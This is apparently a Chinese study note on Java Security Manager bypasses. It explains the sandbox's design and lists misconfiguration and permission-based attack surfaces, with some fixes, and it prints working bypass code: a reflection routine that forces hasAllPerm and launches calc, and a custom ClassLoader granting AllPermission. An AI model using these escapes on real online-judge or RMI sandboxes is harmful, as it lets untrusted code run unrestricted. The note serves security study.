# BypassSM

> 参考：https://www.anquanke.com/post/id/151398
>
> - https://docs.oracle.com/javase/8/docs/api/java/lang/SecurityManager.html
> - https://docs.oracle.com/javase/8/docs/api/java/lang/RuntimePermission.html
> - https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html

原理：

 	1. 每个类都有一个ProtectionDomain
 	 	1. CodeSource:(由类的URL+签名构成)
 	 	2. Permission:
 	2. 默认的AccessController实现:
 	 	1. 自顶向下的堆栈检查
 	 	2. doPrivileged
 	3. ProtectionDomain的初始化

配置:

	1. `-Djava.security.manger`打开java Security Manager
	1. `-Djava.security.policy`指定policy文件
	1. `policy`文件配置：[权限配置](https://docs.oracle.com/javase/8/docs/technotes/guides/security/permissions.html)，[policy文件](https://docs.oracle.com/javase/8/docs/technotes/guides/security/permissions.html)

攻击面:

 1. 错误的policy文件配置:

    	1. 一个等于号指定policy文件
        	2. 其他配置错误: 子目录，通配符

 2. 第三方实现

    	1. 黑白名单方式

 3. 授予某些权限导致bypass

    	1. 加载底层库
        	2. 反射：直接反射`System.setSecurity`,`反射defineClass`,反射`hasAllperm`
        	3. 创建(继承)类加载器+`doPrivileged`
        	4. `setSecurityManager`

应用场景：

​    运行来源不可信的代码: Online Judge+量化交易+RMI

## 原理

Java沙箱由以下部分组成：

- 类加载器结构（例如命名空间）
- class文件校验器
- 内置于Java虚拟机（和Java语言）的安全特性（例如对指针操作的屏蔽等）
- Java安全管理器（Java Security Manager）和Java API组成

而其中前三者都已经内置在`jvm`和java语言中了。所以能够被用户操作的就只有`Java Security Manager`了。

**Java Security Manager**的设计：

`-Djava.security.manager=`后面如果接了类，就可以自定义实现`SercurityManager`。但是一般情况下都选择默认的

`-Djava.security.manager -Djava.security.policy=` 后面接`policy`文件的路径，会根据配置文件来设置权限。

> 策略(policy)文件是一个配置文件，指定了哪些类有哪些权限。在该文件中，指定具体的类时，是使用的`sign`+`datasource`=`protectedDomain`

根据java的设计，一个类的url和签名组成了这个类的CodeSource，根据policy文件的配置，一个CodeSource有一定的权限。一个类的CodeSource和它的权限构成了这个类的ProtectionDomain

**怎样检测权限**：

`AccessController.checkPermission`的实现： `AC`自顶向下遍历但前的栈，栈由栈帧组成，每一个栈都是一个方法调用形成，每个栈帧对应一个类的`ProtectionDomain`,`AC`遍历到没有权限，则会抛出异常。

> `doPrivilege`，当这个方法被调用时，AC也会白能力，不过只调用到调用`doPrivilege`的方法的栈帧就停止。所以这个方法是十分危险的。它截断了AccessController的检查。之前Java Security Manager出过的几次漏洞都跟jdk类库不当调用doPrivileged方法，而doPrivileged方法中执行的操作能被用户代码控制有关。

## 绕过

**单等号+home目录可写导致Java Security Manager绕过**

在java的默认配置中，`jre/lib/security/java.security`是Java中的默认安全配置文件，在配置文件中制定了两个默认的`poplicy`文件

```
policy.url.1=file:${java.home}/lib/security/java.policy
policy.url.2=file:${user.home}/.java.policy
```

在通过`-Djava.security.policy`指定我们自己的policy文件时，如果是一个等号，那么就会默认把上面这个文件加载进来。那么如果`home`目录可写，我们就可以通过在home目录下写这个文件来实现bypass。

**通过setSecurityManager绕过**

`java security manager`有两种方式可以指定，一种是`Djava.security.policy==java.policy`,一种是`System.setSecurityManager()`.

```java
System.setSecurityManager(null);
```

**通过反射绕过Java Security Manager**

`System.setSecurityManager()`函数本身内部的实现就是对于系统变量中的`security`的一个赋值。那么是否可以通过反射来修改呢？

```java
    static {
        HashMap var0 = new HashMap();
        var0.put(Reflection.class, new String[]{"fieldFilterMap", "methodFilterMap"});
        var0.put(System.class, new String[]{"security"});
        var0.put(Class.class, new String[]{"classLoader"});
        fieldFilterMap = var0;
        methodFilterMap = new HashMap();
    }
```

在反射的实现中，禁止了以下这个变量。所以还有什么办法呢？

`既然检查人员不能修改，那我就修改检查的对象`。

```java
public static void setHasAllPerm0(){
        StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace();
        //遍历栈帧
        for (StackTraceElement stackTraceElement : stackTraceElements) {
            try {
                Class clz=Class.forName(stackTraceElement.getClassName());
                //利用反射调用getProtectionDomain0方法
                Method getProtectionDomain=clz.getClass().getDeclaredMethod("getProtectionDomain0",null);
                getProtectionDomain.setAccessible(true);
                ProtectionDomain pd=(ProtectionDomain) getProtectionDomain.invoke(clz);

                if(pd!=null){
                    Field field=pd.getClass().getDeclaredField("hasAllPerm");
                    field.setAccessible(true);
                    field.set(pd,true);
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        exec("calc");
    }
```

> 这里面一个关键的思路在于: 很多类本身对于policy的实现大概是这样： `public`方法中先检测权限，然后再调用`private`方法，那么我们有反射权限的时候，就可以直接调用私有方法即可。

这里最简单的修复方式：`不授予accessDeclaredMembers权限和suppressAccessChecks权限。`

但是反射最为java的拿手好戏，被完全ban掉是不可能的，所以在`sun.reflect.Reflection`中定义了静态的`methodFilterMap`和`fieldMethodMap`，在这里面的方法和变量禁止反射。`sun.reflect.Reflection`还提供了几个方法，可以往`methodFilterMap`和`fieldMethodMap`中添加自定义的黑名单。

**创建类加载器绕过JSM**

一个类的protectiondomain在这个类被加载器加载时初始化，如果我们能自定义一个类加载器，加载一个恶意的类，并且把它的protectionDomain里面的权限初始化为所有权限，这个恶意类是不是就有所有权限了，`AC`的检测并不会只看他，还要看整个栈，这个时候就是`doPrivileged`了，只要`AC`遍历到该类就不会再继续检测下去。

https://github.com/codeplutos/java-security-manager-bypass/issues/2

```java
package com.evil;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.nio.ByteBuffer;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.channels.WritableByteChannel;
import java.security.*;
import java.security.cert.Certificate;

public class MyClassLoader extends ClassLoader {
    public MyClassLoader() {
    }

    public MyClassLoader(ClassLoader parent) {
        super(parent);
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        File file = getClassFile(name);
        try {
            byte[] bytes = getClassBytes(file);
            //在这里调用defineClazz，而不是super.defineClass
            Class<?> c = defineClazz(name, bytes, 0, bytes.length);
            return c;
        } catch (Exception e) {
            e.printStackTrace();
        }

        return super.findClass(name);
    }

    protected final Class<?> defineClazz(String name, byte[] b, int off, int len) throws ClassFormatError {
        try {
            PermissionCollection pc=new Permissions();
            pc.add(new AllPermission());

            //设置ProtectionDomain
            ProtectionDomain pd = new ProtectionDomain(new CodeSource(null, (Certificate[]) null),
                    pc, this, null);
            return this.defineClass(name, b, off, len, pd);
        } catch (Exception e) {
            return null;
        }
    }

    private File getClassFile(String name) {
        File file = new File("./" + name + ".class");
        return file;
    }
      @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        if (name.contains("Exploit")) {
            return findClass(name);
        }
        return super.loadClass(name);
    }

    private byte[] getClassBytes(File file) throws Exception {
        FileInputStream fis = new FileInputStream(file);
        FileChannel fc = fis.getChannel();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        WritableByteChannel wbc = Channels.newChannel(baos);
        ByteBuffer by = ByteBuffer.allocate(1024);

        while (true) {
            int i = fc.read(by);
            if (i == 0 || i == -1) {
                break;
            }

            by.flip();
            wbc.write(by);
            by.clear();
        }
        fis.close();
        return baos.toByteArray();
    }
}

```

**本地方法调用绕过Java Security Manager**

Java Security Manager是在java核心库中的一个功能，而java中native方法是由jvm执行的，不受java security manager管控。

修复方案：不授予loadLibrary权限

> 生成.h头
>
> ```shell
> javac src/com/evil/EvilMethodClass.java -d ./bin
> javah -jni -classpath ./bin -d ./jni com.evil.EvilMethodClass
> javah -jni -classpath ./bin -o EvilMethodClass.h com.evil.EvilMethodClass
> ```

## 配置

## 附录

##### A

| 权限名                | 用途说明                                                     |
| --------------------- | ------------------------------------------------------------ |
| accessClassInPackage. | 允许代码访问指定包中的类                                     |
| accessDeclaredMembers | 允许代码使用反射访问其他类中私有或保护的成员                 |
| createClassLoader     | 允许代码实例化类加载器                                       |
| createSecurityManager | 允许代码实例化安全管理器，它将允许程序化的实现对沙箱的控制   |
| defineClassInPackage. | 允许代码在指定包中定义类                                     |
| exitVM                | 允许代码关闭整个虚拟机                                       |
| getClassLoader        | 允许代码访问类加载器以获得某个特定的类                       |
| getProtectionDomain   | 允许代码访问保护域对象以获得某个特定类                       |
| loadlibrary.          | 允许代码装载指定类库                                         |
| modifyThread          | 允许代码调整指定的线程参数                                   |
| modifyThreadGroup     | 允许代码调整指定的线程组参数                                 |
| queuePrintJob         | 允许代码初始化一个打印任务                                   |
| readFileDescriptor    | 允许代码读文件描述符（相应的文件是由其他保护域中的代码打开的） |
| setContextClassLoader | 允许代码为某线程设置上下文类加载器                           |
| setFactory            | 允许代码创建套接字工厂                                       |
| setIO                 | 允许代码重定向System.in、System.out或System.err输入输出流    |
| setSecurityManager    | 允许代码设置安全管理器                                       |
| stopThread            | 允许代码调用线程类的stop()方法                               |
| writeFileDescriptor   | 允许代码写文件描述符                                         |

##### B

| 权限名                         | 用途说明                      |
| ------------------------------ | ----------------------------- |
| accessClipboard                | 允许访问系统的全局剪贴板      |
| accessEventQueue               | 允许直接访问事件队列          |
| createRobot                    | 允许代码创建AWT的Robot类      |
| listenToAllAWTEvents           | 允许代码直接监听事件分发      |
| readDisplayPixels              | 允许AWT Robot读显示屏上的像素 |
| showWindowWithoutWarningBanner | 允许创建无标题栏的窗口        |

##### C

| 权限名                        | 用途说明                      |
| ----------------------------- | ----------------------------- |
| specifyStreamHandler          | 允许在URL类中安装新的流处理器 |
| setDefaultAuthenticator       | 可以安装鉴别类                |
| requestPassworkAuthentication | 可以完成鉴别                  |

##### D

| 权限名                     | 用途说明                                 |
| -------------------------- | ---------------------------------------- |
| addIdentityCertificate     | 为Identity增加一个证书                   |
| clearProviderProperties.   | 针对指定的提供者，删除所有属性           |
| createAccessControlContext | 允许创建一个存取控制器的上下文环境       |
| getDomainCombiner          | 允许撤销保护域                           |
| getPolicy                  | 检索可以实现沙箱策略的类                 |
| getProperty.               | 读取指定的安全属性                       |
| getSignerPrivateKey        | 由Signer对象获取私有密钥                 |
| insertProvider.            | 将指定的提供者添加到响应的安全提供者组中 |
| loadProviderProperties.    | 装载指定的提供者的属性                   |
| printIdentity              | 打印Identity类内容                       |
| putAllProviderProperties.  | 更新指定的提供者的属性                   |
| putProviderProperty.       | 为指定的提供者增加一个属性               |
| removeIdentityCertificate  | 取消Identity对象的证书                   |
| removeProvider.            | 将指定的提供者从相应的安全提供者组中删除 |
| removeProviderProperty.    | 删除指定的安全提供者的某个属性           |
| setIdentityInfo            | 为某个Identity对象设置信息串             |
| setIdentityPublicKey       | 为某个Identity对象设置公钥               |
| setPolicy                  | 设置可以实现沙箱策略的类                 |
| setProperty.               | 设置指定的安全属性                       |
| setSignerKeyPair           | 在Signer对象中设置密钥对                 |
| setSystemScope             | 设置系统所用的IdentityScope              |

##### E

| 权限名                       | 用途说明                                                     |
| ---------------------------- | ------------------------------------------------------------ |
| enableSubstitution           | 允许实现ObjectInputStream类的enableResolveObject()方法和ObjectOutputStream类的enableReplaceObject()方法 |
| enableSubclassImplementation | 允许ObjectInputStream和ObjectOutputStream创建子类，子类可以覆盖readObject()和writeObject()方法 |
